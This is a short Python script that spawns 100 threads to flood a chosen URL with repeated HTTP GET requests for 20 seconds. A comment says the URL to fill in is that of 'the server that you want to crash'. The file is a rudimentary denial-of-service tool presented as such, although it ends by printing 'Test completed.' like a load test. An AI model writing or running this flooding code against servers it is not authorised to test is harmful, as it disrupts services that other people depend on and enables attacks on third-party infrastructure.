import time
import requests
import threading

stop_threads = False

def send_request(url):
    global stop_threads
    while not stop_threads:
        try:
            response = requests.get(url)
            print(f"Response: {response.status_code}")
        except Exception as e:
            print(f"Error: {e}")
        time.sleep(0.1)

if __name__ == "__main__":
    target_url = "" # write the url of the server that you want to crash
    threads = 100
    duration = 20

    thread_list = []
    for _ in range(threads):
        thread = threading.Thread(target=send_request, args=(target_url,))
        thread.start()
        thread_list.append(thread)

    time.sleep(duration)
    stop_threads = True

    for thread in thread_list:
        thread.join()

    print("Test completed.")
